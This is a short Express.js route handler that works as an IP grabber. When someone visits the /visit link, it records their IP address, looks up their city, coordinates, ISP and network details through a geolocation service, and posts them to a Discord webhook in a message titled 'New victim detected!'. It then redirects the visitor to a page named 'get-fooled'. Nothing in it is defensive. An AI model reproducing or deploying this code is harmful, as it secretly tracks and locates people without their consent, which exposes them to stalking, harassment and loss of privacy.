app.get("/visit", async (req, res) => {
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || req.connection.remoteAddress;
    if (ip.includes(",")) ip = ip.split(",")[0].trim();
    if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");

    console.log("Visitor IP:", ip);

    try {
        const geoResponse = await fetch(`https://ip-api.com/json/${ip}?fields=query,status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname`);
        const geoData = await geoResponse.json();
        console.log("Geo data:", geoData);

        const payload = {
            content: `📢 New victim detected!
🌐 IP: ${geoData.query}
✅ Status: ${geoData.status}
🌍 Continent: ${geoData.continent} (${geoData.continentCode})
🇨🇳 Country: ${geoData.country} (${geoData.countryCode})
🏙 Region/City: ${geoData.regionName}, ${geoData.city}
📍 District/ZIP: ${geoData.district}, ${geoData.zip}
🗺 Coordinates: ${geoData.lat}, ${geoData.lon}
⏱ Timezone/Offset: ${geoData.timezone}, ${geoData.offset}
💰 Currency: ${geoData.currency}
💻 ISP/Org: ${geoData.isp}, ${geoData.org}
🆔 AS/ASName: ${geoData.as}, ${geoData.asname}`
        };

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        console.log("Discord response status:", discordResponse.status, discordResponse.ok ? "OK" : "Failed");

        if (!discordResponse.ok) console.error("Discord webhook failed:", await discordResponse.text());

        res.redirect("https://get-fooled.onrender.com");
    } catch (err) {
        console.error("Error sending to Discord:", err);
        res.sendStatus(500);
    }
});
